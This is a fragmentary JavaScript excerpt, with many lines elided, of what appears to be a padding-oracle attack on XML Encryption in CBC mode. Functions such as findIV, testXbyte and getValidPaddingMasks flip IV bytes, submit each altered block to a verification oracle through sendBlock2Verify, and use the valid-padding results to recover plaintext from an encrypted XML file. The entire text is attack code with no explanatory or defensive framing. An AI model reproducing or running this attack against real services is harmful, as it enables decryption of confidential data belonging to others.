...
function recoverEncryted2PlainXML(encryptedXMLFile, callback) {
    ...
    findIV(cipher, i, function(iv, blockCipher){
      ...
      async.map(bitArr,
        ...
        function (err, results) {
          ...
          //console.log("hiiiiiiiiiii", plainBlock.toString('ascii'));
          cb(null, plainBlock);
        }
      );
    });
...
function findIV(cipher, blockNum, cb) {
  ...
  async.doUntil(
      ...
      function() {
        //console.log("TEST", paddingSet);
        if (paddingSet.length === v) {
          return true
        } else {
          //console.log(paddingSet.length - 1);
  ...
  testXbyte(iv, blockC, j, msk, function(aSet) {
    if (aSet.length === 1) {
        testXbyte(iv, blockC, j, mskForC1.map(function(x){return x^aSet[0]}), function(bSet) {
          //console.log("dddd", blockC, j, iv[j], msk, aSet, bSet);
          assert.equal(bSet.length, 1);
          cb(aSet, 0x3C ^ bSet[0]);
        });
    } else
...
function getValidPaddingMasks(iv, blockCipher, callback) {
  var paddingSet = [];
  var masks = fillArrayWithNumbers(0x7f + 1);
  //console.log(masks)
  async.each(masks,
      function (item, done) {
        ...
        iv.copy(tmpIV);
        tmpIV[v-1] ^= item;
        sendBlock2Verify(tmpIV, blockCipher, function (result) {
          if (result === true)
            paddingSet.push(item);
          done();
        });
      },
      function (err) {
